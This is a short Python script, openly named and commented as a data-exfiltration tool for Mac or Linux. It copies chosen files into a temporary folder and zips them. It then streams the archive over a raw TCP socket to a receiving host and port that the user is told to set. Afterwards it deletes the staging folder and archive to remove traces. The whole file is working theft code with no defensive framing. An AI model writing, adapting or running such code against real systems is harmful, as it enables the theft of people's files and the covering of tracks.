import os
import socket
import shutil

#ONLY FOR MAC OR LINUX
tmp = "../../../../../../../../../.././../../tmp/"
exfil = os.path.join(tmp, "Exfil")

# CHANGE ME REQUIRED
pathNames = [""]
# CHANGE ME THIS WHERE WE RECIEVE
HOST, PORT = "127.0.0.1", 1234

def cleanUp():
    global exfil, tmp
    try:
        shutil.rmtree(exfil)
    except OSError:
        pass

    zip_file_path = os.path.join(tmp, "DataSend.zip")
    if os.path.exists(zip_file_path):
        try:
            os.remove(zip_file_path)
        except OSError:
            pass

def filePrep():
    global tmp, exfil, pathNames
    try:
        os.mkdir(exfil)
    except OSError:
        cleanUp()
        return

    for path in pathNames:
        try:
            shutil.copy(path, exfil)
        except shutil.Error as e:
            cleanUp()
            return

    shutil.make_archive(os.path.join(tmp, "DataSend"), 'zip', exfil)

def theActualExfil():
    filePrep()
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        sock.connect((HOST, PORT))
        file_to_send = open((tmp + "DataSend.zip"), "rb")
    
        data = file_to_send.read(1024)
        while data:
            print("Sending...")
            sock.send(data)
            data = file_to_send.read(1024)  # Read the next chunk of data
    
        file_to_send.close()
    except socket.error as e:
        cleanUp()
    finally:
        sock.close()
        cleanUp()


if __name__ == "__main__":
    theActualExfil()
